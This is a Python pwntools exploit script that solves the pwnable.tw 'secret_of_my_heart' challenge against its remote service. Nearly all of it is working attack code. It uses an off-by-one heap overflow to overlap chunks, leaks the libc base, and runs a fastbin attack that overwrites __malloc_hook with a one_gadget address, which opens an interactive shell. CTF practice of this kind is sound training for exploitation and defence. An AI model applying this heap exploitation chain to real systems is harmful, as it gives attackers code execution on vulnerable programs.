#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("secret_of_my_heart_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

local = False 
if local:
    p = process("./secret_of_my_heart_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10302)

elf = context.binary = ELF('./secret_of_my_heart_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

############################################

def add(size, data, sec):
    sla(b'Your choice :', str(1))
    sla(b'heart :', str(size))
    sa(b'heart :', data)
    sa(b'heart :', sec)

def show(idx):
    sla(b'Your choice :', str(2))
    sla(b'Index :', str(idx))

def free(idx):
    sla(b'Your choice :', str(3))
    sla(b'Index :', str(idx))

def secret():
    sla(b'Your choice :', str(4869))

############################################

add(0x28,b"0000",b"a"*0x28) #idx0  free
add(0x100,b"1111",b"b"*0xf0+p64(0x100)) #idx1 free
add(0x100,b"2222",b"c"*0x100) #idx2 free

free(1)
free(0)

add(0x28,b"0000",b"d"*0x28) #idx0
add(0x80,b"0000",b"d"*0x80) #idx1 free
add(0x10,b"3333",b"f"*0x10) #idx3

free(1)
free(2)

add(0x80,b"1111",b"g"*0x80) #idx1
add(0x100,b"2222",b"h"*0x68+p64(0x1234))  #idx2
add(0x80,b"4444",b"i"*0x80) #idx4 seperate from top chunk

free(2)

#============leak_libc============#

show(3)
p.recvuntil(b'Secret : ')
libc.address = int.from_bytes(p.recv(6), "little") - 0x3c3b78
info('Libc_base :           '+ hex(libc.address))
info('Malloc_hook :         '+ hex(libc.sym['__malloc_hook']))
info('Malloc_hook-0x13 :    '+ hex(libc.sym['__malloc_hook']-0x13))
free(1)
payload = b"a"*0x80 + p64(0) + p64(0x71)
add(0x100,b"1111",payload) #idx1

free(3)
free(1)
payload = b'a'*0x80 + p64(0) + p64(0x71) + p64(libc.sym['__malloc_hook'] - 0x23)
add(0x100, b'1111', payload)
add(0x60, b'dcm', b'hehehe')


og = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
ogg = og[2]
add(0x60, b'dcm', b'\x00'*19 + p64(libc.address+ogg))

free(3)
p.interactive()
